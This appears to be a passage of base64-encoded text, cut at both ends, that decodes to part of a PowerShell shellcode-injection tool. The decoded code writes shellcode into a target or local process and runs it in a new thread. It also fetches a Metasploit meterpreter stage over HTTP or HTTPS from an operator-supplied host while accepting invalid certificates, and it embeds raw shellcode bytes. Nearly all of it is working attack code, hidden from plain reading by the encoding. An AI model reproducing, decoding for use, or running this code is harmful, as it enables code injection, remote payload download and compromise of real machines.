5b3Ugd2FudCB0aGlzIHRvIHdvcmsuJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJElzV293NjQpICMgMzItYml0IFdvdzY0IHByb2Nlc3MKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTMyCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdJbmplY3RpbmcgaW50byBhIFdvdzY0IHByb2Nlc3MuJwogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgMzItYml0IHNoZWxsY29kZS4nCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSAjIDY0LWJpdCBwcm9jZXNzCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlNjQuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTY0IHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGU2NAogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgNjQtYml0IHNoZWxsY29kZS4nCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSAjIDMyLWJpdCBDUFUKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgMzItYml0IHNoZWxsY29kZS4nCiAgICAgICAgfQoKICAgICAgICAjIFJlc2VydmUgYW5kIGNvbW1pdCBlbm91Z2ggbWVtb3J5IGluIHJlbW90ZSBwcm9jZXNzIHRvIGhvbGQgdGhlIHNoZWxsY29kZQogICAgICAgICRSZW1vdGVNZW1BZGRyID0gJFZpcnR1YWxBbGxvY0V4Lkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICAKICAgICAgICBpZiAoISRSZW1vdGVNZW1BZGRyKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBhbGxvY2F0ZSBzaGVsbGNvZGUgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2hlbGxjb2RlIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZU1lbUFkZHIuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIENvcHkgc2hlbGxjb2RlIGludG8gdGhlIHByZXZpb3VzbHkgYWxsb2NhdGVkIG1lbW9yeQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnkuSW52b2tlKCRoUHJvY2VzcywgJFJlbW90ZU1lbUFkZHIsICRTaGVsbGNvZGUsICRTaGVsbGNvZGUuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsCgogICAgICAgICMgR2V0IGFkZHJlc3Mgb2YgRXhpdFRocmVhZCBmdW5jdGlvbgogICAgICAgICRFeGl0VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgRXhpdFRocmVhZAoKICAgICAgICBpZiAoJElzV293NjQpCiAgICAgICAgewogICAgICAgICAgICAjIEJ1aWxkIDMyLWJpdCBpbmxpbmUgYXNzZW1ibHkgc3R1YiB0byBjYWxsIHRoZSBzaGVsbGNvZGUgdXBvbiBjcmVhdGlvbiBvZiBhIHJlbW90ZSB0aHJlYWQuCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJFJlbW90ZU1lbUFkZHIgJEV4aXRUaHJlYWRBZGRyIDMyCiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyAzMi1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgIyBCdWlsZCA2NC1iaXQgaW5saW5lIGFzc2VtYmx5IHN0dWIgdG8gY2FsbCB0aGUgc2hlbGxjb2RlIHVwb24gY3JlYXRpb24gb2YgYSByZW1vdGUgdGhyZWFkLgogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRSZW1vdGVNZW1BZGRyICRFeGl0VGhyZWFkQWRkciA2NAogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgNjQtYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQoKICAgICAgICAjIEFsbG9jYXRlIGlubGluZSBhc3NlbWJseSBzdHViCiAgICAgICAgJFJlbW90ZVN0dWJBZGRyID0gJFZpcnR1YWxBbGxvY0V4Lkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgCiAgICAgICAgaWYgKCEkUmVtb3RlU3R1YkFkZHIpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiVGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRSZW1vdGVTdHViQWRkci5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgV3JpdGUgMzItYml0IGFzc2VtYmx5IHN0dWIgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5IHNwYWNlCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJGhQcm9jZXNzLCAkUmVtb3RlU3R1YkFkZHIsICRDYWxsU3R1YiwgJENhbGxTdHViLkxlbmd0aCwgW1JlZl0gMCkgfCBPdXQtTnVsbAoKICAgICAgICAjIEV4ZWN1dGUgc2hlbGxjb2RlIGFzIGEgcmVtb3RlIHRocmVhZAogICAgICAgICRUaHJlYWRIYW5kbGUgPSAkQ3JlYXRlUmVtb3RlVGhyZWFkLkludm9rZSgkaFByb2Nlc3MsIFtJbnRQdHJdOjpaZXJvLCAwLCAkUmVtb3RlU3R1YkFkZHIsICRSZW1vdGVNZW1BZGRyLCAwLCBbSW50UHRyXTo6WmVybykKICAgICAgICAKICAgICAgICBpZiAoISRUaHJlYWRIYW5kbGUpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGxhdW5jaCByZW1vdGUgdGhyZWFkIGluIFBJRDogJFByb2Nlc3NJRCIKICAgICAgICB9CgogICAgICAgICMgQ2xvc2UgcHJvY2VzcyBoYW5kbGUKICAgICAgICAkQ2xvc2VIYW5kbGUuSW52b2tlKCRoUHJvY2VzcykgfCBPdXQtTnVsbAoKICAgICAgICBXcml0ZS1WZXJib3NlICdTaGVsbGNvZGUgaW5qZWN0aW9uIGNvbXBsZXRlIScKICAgIH0KCiAgICBmdW5jdGlvbiBMb2NhbDpJbmplY3QtTG9jYWxTaGVsbGNvZGUKICAgIHsKICAgICAgICBpZiAoJFBvd2VyU2hlbGwzMmJpdCkgewogICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlMzIgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnVXNpbmcgMzItYml0IHNoZWxsY29kZS4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlNjQuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGU2NCB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGU2NAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CiAgICAKICAgICAgICAjIEFsbG9jYXRlIFJXWCBtZW1vcnkgZm9yIHRoZSBzaGVsbGNvZGUKICAgICAgICAkQmFzZUFkZHJlc3MgPSAkVmlydHVhbEFsbG9jLkludm9rZShbSW50UHRyXTo6WmVybywgJFNoZWxsY29kZS5MZW5ndGggKyAxLCAweDMwMDAsIDB4NDApICMgKFJlc2VydmV8Q29tbWl0LCBSV1gpCiAgICAgICAgaWYgKCEkQmFzZUFkZHJlc3MpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHNoZWxsY29kZSBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQmFzZUFkZHJlc3MuVG9TdHJpbmcoIlgkKFtJbnRQdHJdOjpTaXplKjIpIikpIgoKICAgICAgICAjIENvcHkgc2hlbGxjb2RlIHRvIFJXWCBidWZmZXIKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRTaGVsbGNvZGUsIDAsICRCYXNlQWRkcmVzcywgJFNoZWxsY29kZS5MZW5ndGgpCiAgICAgICAgCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uCiAgICAgICAgJEV4aXRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBFeGl0VGhyZWFkCiAgICAgICAgCiAgICAgICAgaWYgKCRQb3dlclNoZWxsMzJiaXQpCiAgICAgICAgewogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRCYXNlQWRkcmVzcyAkRXhpdFRocmVhZEFkZHIgMzIKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkQ2FsbFN0dWIgPSBFbWl0LUNhbGxUaHJlYWRTdHViICRCYXNlQWRkcmVzcyAkRXhpdFRocmVhZEFkZHIgNjQKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDY0LWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KCiAgICAgICAgIyBBbGxvY2F0ZSBSV1ggbWVtb3J5IGZvciB0aGUgdGhyZWFkIGNhbGwgc3R1YgogICAgICAgICRDYWxsU3R1YkFkZHJlc3MgPSAkVmlydHVhbEFsbG9jLkludm9rZShbSW50UHRyXTo6WmVybywgJENhbGxTdHViLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICBpZiAoISRDYWxsU3R1YkFkZHJlc3MpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHRocmVhZCBjYWxsIHN0dWIuIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJENhbGxTdHViQWRkcmVzcy5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBjYWxsIHN0dWIgdG8gUldYIGJ1ZmZlcgogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJENhbGxTdHViLCAwLCAkQ2FsbFN0dWJBZGRyZXNzLCAkQ2FsbFN0dWIuTGVuZ3RoKQoKICAgICAgICAjIExhdW5jaCBzaGVsbGNvZGUgaW4gaXQncyBvd24gdGhyZWFkCiAgICAgICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVUaHJlYWQuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAwLCAkQ2FsbFN0dWJBZGRyZXNzLCAkQmFzZUFkZHJlc3MsIDAsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIGlmICghJFRocmVhZEhhbmRsZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gbGF1bmNoIHRocmVhZC4iCiAgICAgICAgfQoKICAgICAgICAjIFdhaXQgZm9yIHNoZWxsY29kZSB0aHJlYWQgdG8gdGVybWluYXRlCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRUaHJlYWRIYW5kbGUsIDB4RkZGRkZGRkYpIHwgT3V0LU51bGwKICAgICAgICAKICAgICAgICAkVmlydHVhbEZyZWUuSW52b2tlKCRDYWxsU3R1YkFkZHJlc3MsICRDYWxsU3R1Yi5MZW5ndGggKyAxLCAweDgwMDApIHwgT3V0LU51bGwgIyBNRU1fUkVMRUFTRSAoMHg4MDAwKQogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJEJhc2VBZGRyZXNzLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApCgogICAgICAgIFdyaXRlLVZlcmJvc2UgJ1NoZWxsY29kZSBpbmplY3Rpb24gY29tcGxldGUhJwogICAgfQoKICAgICMgQSB2YWxpZCBwb2ludGVyIHRvIElzV293NjRQcm9jZXNzIHdpbGwgYmUgcmV0dXJuZWQgaWYgQ1BVIGlzIDY0LWJpdAogICAgJElzV293NjRQcm9jZXNzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgSXNXb3c2NFByb2Nlc3MKICAgIGlmICgkSXNXb3c2NFByb2Nlc3NBZGRyKQogICAgewogICAgCSRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgCSRJc1dvdzY0UHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRJc1dvdzY0UHJvY2Vzc0FkZHIsICRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlKQogICAgICAgIAogICAgICAgICQ2NGJpdENQVSA9ICR0cnVlCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAJJDY0Yml0Q1BVID0gJGZhbHNlCiAgICB9CgogICAgaWYgKFtJbnRQdHJdOjpTaXplIC1lcSA0KQogICAgewogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkZmFsc2UKICAgIH0KCiAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdNZXRhc3Bsb2l0JykKICAgIHsKICAgICAgICBpZiAoISRQb3dlclNoZWxsMzJiaXQpIHsKICAgICAgICAgICAgIyBUaGUgY3VycmVudGx5IHN1cHBvcnRlZCBNZXRhc3Bsb2l0IFBscyBhcmUgMzItYml0LiBUaGlzIGJsb2NrIG9mIGNvZGUgaW1wbGVtZW50cyB0aGUgbG9naWMgdG8gZXhlY3V0ZSB0aGlzIHNjcmlwdCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsCiAgICAgICAgICAgICMgR2V0IHRoaXMgc2NyaXB0J3MgY29udGVudHMgYW5kIHBhc3MgaXQgdG8gMzItYml0IHBvd2Vyc2hlbGwgd2l0aCB0aGUgc2FtZSBwYXJhbWV0ZXJzIHBhc3NlZCB0byB0aGlzIGZ1bmN0aW9uCgogICAgICAgICAgICAjIFB1bGwgb3V0IGp1c3QgdGhlIGNvbnRlbnQgb2YgdGhlIHRoaXMgc2NyaXB0J3MgaW52b2NhdGlvbi4KICAgICAgICAgICAgJFJvb3RJbnZvY2F0aW9uID0gJE15SW52b2NhdGlvbi5MaW5lCgogICAgICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQogICAgICAgIAogICAgICAgICAgICBpZiAoICRGb3JjZSAtb3IgKCAkUmVzcG9uc2UgPSAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICJEbyB5b3Ugd2FudCB0byBsYXVuY2ggdGhlIFBsIGZyb20geDg2IFBvd2Vyc2hlbGw/IiwKICAgICAgICAgICAgICAgICAgICJBdHRlbXB0IHRvIGV4ZWN1dGUgMzItYml0IHNoZWxsY29kZSBmcm9tIDY0LWJpdCBQb3dlcnNoZWxsLiBOb3RlOiBUaGlzIHByb2Nlc3MgdGFrZXMgYWJvdXQgb25lIG1pbnV0ZS4gQmUgcGF0aWVudCEgWW91IHdpbGwgYWxzbyBzZWUgc29tZSBhcnRpZmFjdHMgb2YgdGhlIHNjcmlwdCBsb2FkaW5nIGluIHRoZSBvdGhlciBwcm9jZXNzLiIgKSApICkgeyB9CiAgICAgICAgCiAgICAgICAgICAgIGlmICggISRSZXNwb25zZSApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gbGF1bmNoIHRoZSAzMi1iaXQgUGwgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbC4gRXhpdCBmdW5jdGlvbgogICAgICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgU2luY2UgdGhlIHNoZWxsY29kZSB3aWxsIHJ1biBpbiBhIG5vbmludGVyYWN0aXZlIGluc3RhbmNlIG9mIFBvd2VyU2hlbGwsIG1ha2Ugc3VyZSB0aGUgLUZvcmNlIHN3aXRjaCBpcyBpbmNsdWRlZCBzbyB0aGF0IHRoZXJlIGlzIG5vIHdhcm5pbmcgcHJvbXB0LgogICAgICAgICAgICBpZiAoJE15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnNbJ0ZvcmNlJ10pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkV4ZWN1dGluZyB0aGUgZm9sbG93aW5nIGZyb20gMzItYml0IFBvd2VyU2hlbGw6ICRSb290SW52b2NhdGlvbiIKICAgICAgICAgICAgICAgICRDb21tYW5kID0gImZ1bmN0aW9uICQoJE15SW52b2NhdGlvbi5JbnZvY2F0aW9uTmFtZSkge2BuIiArICRNeUludm9jYXRpb24uTXlDb21tYW5kLlNjcmlwdEJsb2NrICsgImBufWBuJCgkUm9vdEludm9jYXRpb24pYG5gbiIKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkV4ZWN1dGluZyB0aGUgZm9sbG93aW5nIGZyb20gMzItYml0IFBvd2VyU2hlbGw6ICRSb290SW52b2NhdGlvbiAtRm9yY2UiCiAgICAgICAgICAgICAgICAkQ29tbWFuZCA9ICJmdW5jdGlvbiAkKCRNeUludm9jYXRpb24uSW52b2NhdGlvbk5hbWUpIHtgbiIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5TY3JpcHRCbG9jayArICJgbn1gbiQoJFJvb3RJbnZvY2F0aW9uKSAtRm9yY2VgbmBuIgogICAgICAgICAgICB9CgogICAgICAgICAgICAkQ29tbWFuZEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QXNjaWkuR2V0Qnl0ZXMoJENvbW1hbmQpCiAgICAgICAgICAgICRFbmNvZGVkQ29tbWFuZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJENvbW1hbmRCeXRlcykKCiAgICAgICAgICAgICRFeGVjdXRlID0gJyRDb21tYW5kJyArICIgfCAkRW52OndpbmRpclxTeXNXT1c2NFxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLUNvbW1hbmQgLSIKICAgICAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gLUNvbW1hbmQgJEV4ZWN1dGUgfCBPdXQtTnVsbAoKICAgICAgICAgICAgIyBFeGl0IHRoZSBzY3JpcHQgc2luY2UgdGhlIHNoZWxsY29kZSB3aWxsIGJlIHJ1bm5pbmcgZnJvbSB4ODYgUG93ZXJTaGVsbAogICAgICAgICAgICBSZXR1cm4KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJFJlc3BvbnNlID0gJFRydWUKICAgICAgICAKICAgICAgICBpZiAoICRGb3JjZSAtb3IgKCAkUmVzcG9uc2UgPSAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICJEbyB5b3Uga25vdyB3aGF0IHlvdSdyZSBkb2luZz8iLAogICAgICAgICAgICAgICAiQWJvdXQgdG8gZG93bmxvYWQgTWV0YXNwbG9pdCBQbCAnJCgkUGwpJyBIPSQoJEgpLCBPPSQoJE8pIiApICkgKSB7IH0KICAgICAgICAKICAgICAgICBpZiAoICEkUmVzcG9uc2UgKQogICAgICAgIHsKICAgICAgICAgICAgIyBVc2VyIG9wdGVkIG5vdCB0byBjYXJyeSBvdXQgZG93bmxvYWQgb2YgTWV0YXNwbG9pdCBQbC4gRXhpdCBmdW5jdGlvbgogICAgICAgICAgICBSZXR1cm4KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgc3dpdGNoICgkUGwpCiAgICAgICAgewogICAgICAgICAgICAnd2luZG93cy9tZXRlcnByZXRlci9yZXZlcnNlX2h0dHAnCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTU0wgPSAnJwogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAncl9odHRwcycKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNTTCA9ICdzJwogICAgICAgICAgICAgICAgIyBBY2NlcHQgaW52YWxpZCBjZXJ0aWZpY2F0ZXMKICAgICAgICAgICAgICAgIFtTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZXJ2ZXJDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFjayA9IHsgJHRydWUgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIAogICAgICAgICMgTWV0ZXJwcmV0ZXIgZXhwZWN0cyAnSU5JVE0nIGluIHRoZSBVUkkgaW4gb3JkZXIgdG8gaW5pdGlhdGUgc3RhZ2UgMC4gQXdlc29tZSBhdXRoZW50aWNhdGlvbiwgaHVoPwogICAgICAgICRSZXF1ZXN0ID0gImh0dHAkKCRTU0wpOi8vJCgkSCk6JCgkTykvSU5JVE0iCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiUmVxdWVzdGluZyBtZXRlcnByZXRlciBQbCBmcm9tICRSZXF1ZXN0IgogICAgICAgIAogICAgICAgICRVcmkgPSBOZXctT2JqZWN0IFVyaSgkUmVxdWVzdCkKICAgICAgICAkV2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAogICAgICAgICRXZWJDbGllbnQuSGVhZGVycy5BZGQoJ3VzZXItYWdlbnQnLCAiJFVzZXJBZ2VudCIpCiAgICAgICAgCiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSAkV2ViQ2xpZW50LkRvd25sb2FkRGF0YSgkVXJpKQogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIiQoJEVycm9yWzBdLkV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyCgogICAgfQogICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NoZWxsY29kZSddKQogICAgewogICAgICAgICMgVXNlcnMgcGFzc2luZyBpbiBzaGVsbGNvZGUgIHRocm91Z2ggdGhlICctU2hlbGxjb2RlJyBwYXJhbWV0ZXIgYXJlIHJlc3BvbnNpYmxlIGZvciBlbnN1cmluZyBpdCB0YXJnZXRzCiAgICAgICAgIyB0aGUgY29ycmVjdCBhcmNoaXRlY2h0dXJlIC0geDg2IHZzLiB4NjQuIFRoaXMgc2NyaXB0IGhhcyBubyB3YXkgdG8gdmFsaWRhdGUgd2hhdCB5b3UgcHJvdmlkZSBpdC4KICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSAkU2hlbGxjb2RlCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgIyBQb3AgYSBjYWxjLi4uIG9yIHdoYXRldmVyIHNoZWxsY29kZSB5b3UgZGVjaWRlIHRvIHBsYWNlIGluIGhlcmUKICAgICAgICAjIEkgc2luY2VyZWx5IGhvcGUgeW91IHRydXN0IHRoYXQgdGhpcyBzaGVsbGNvZGUgYWN0dWFsbHkgcG9wcyBhIGNhbGMuLi4KICAgICAgICAjIEluc2VydCB5b3VyIHNoZWxsY29kZSBoZXJlIGluIHRoZSBmb3IgMHhYWCwweFhYLC4uLgogICAgICAgICMgMzItYml0IFBsCiAgICAgICAgIyBtc2ZQbCB3aW5kb3dzL2V4ZWMgQ01EPSJjbWQgL2sgY2FsYyIgRVhJVEZVTkM9dGhyZWFkCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gQCgweGZjLDB4ZTgsMHg4OSwweDAwLDB4MDAsMHgwMCwweDYwLDB4ODksMHhlNSwweDMxLDB4ZDIsMHg2NCwweDhiLDB4NTIsMHgzMCwweDhiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1MiwweDBjLDB4OGIsMHg1MiwweDE0LDB4OGIsMHg3MiwweDI4LDB4MGYsMHhiNywweDRhLDB4MjYsMHgzMSwweGZmLDB4MzEsMHhjMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4YWMsMHgzYywweDYxLDB4N2MsMHgwMiwweDJjLDB4MjAsMHhjMSwweGNmLDB4MGQsMHgwMSwweGM3LDB4ZTIsMHhmMCwweDUyLDB4NTcsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NTIsMHgxMCwweDhiLDB4NDIsMHgzYywweDAxLDB4ZDAsMHg4YiwweDQwLDB4NzgsMHg4NSwweGMwLDB4NzQsMHg0YSwweDAxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhkMCwweDUwLDB4OGIsMHg0OCwweDE4LDB4OGIsMHg1OCwweDIwLDB4MDEsMHhkMywweGUzLDB4M2MsMHg0OSwweDhiLDB4MzQsMHg4YiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkNiwweDMxLDB4ZmYsMHgzMSwweGMwLDB4YWMsMHhjMSwweGNmLDB4MGQsMHgwMSwweGM3LDB4MzgsMHhlMCwweDc1LDB4ZjQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAzLDB4N2QsMHhmOCwweDNiLDB4N2QsMHgyNCwweD